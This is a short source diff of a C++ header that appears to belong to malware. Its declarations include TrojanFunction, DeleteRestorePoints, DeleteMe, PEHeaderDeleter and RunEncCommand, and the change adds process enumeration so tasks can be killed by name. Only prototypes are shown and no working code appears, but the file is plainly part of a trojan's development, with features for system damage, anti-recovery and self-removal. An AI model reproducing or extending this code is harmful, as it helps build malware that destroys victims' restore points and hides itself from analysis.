@@ -8,6 +8,7 @@
 #include <MinHook.h>
 #include <DbgHelp.h>
 #include <wininet.h>
+#include <Tlhelp32.h>
 #include <atlimage.h>
 #include <winternl.h>
 #include <VersionHelpers.h>
@@ -77,7 +78,8 @@ std::map<std::string, std::string> GetLinks();
 std::string RunEncCommand(const std::string& cmd);
 std::string GenerateRandom(const int len);
 DWORD TrojanFunction(LPVOID url);
-DWORD RemoveTasks(LPVOID params_useless);
+void RemoveTaskByName(const std::wstring& processName);
+void RemoveTasks();
 void DeleteRestorePoints();
 void DeleteMe(const std::string& myPath);
 void PEHeaderDeleter();
